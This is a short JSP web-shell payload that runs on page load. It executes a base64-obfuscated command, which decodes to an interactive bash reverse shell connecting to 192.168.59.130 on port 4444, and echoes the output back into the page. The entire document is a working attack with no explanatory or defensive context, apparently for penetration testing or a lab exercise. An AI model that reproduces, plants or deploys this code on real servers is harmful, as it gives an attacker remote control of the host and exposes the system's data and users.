<%
    String command = "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU5LjEzMC80NDQ0IDA+JjE= | base64 -d | bash";
    Process proc = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", command});
    java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(proc.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
%>
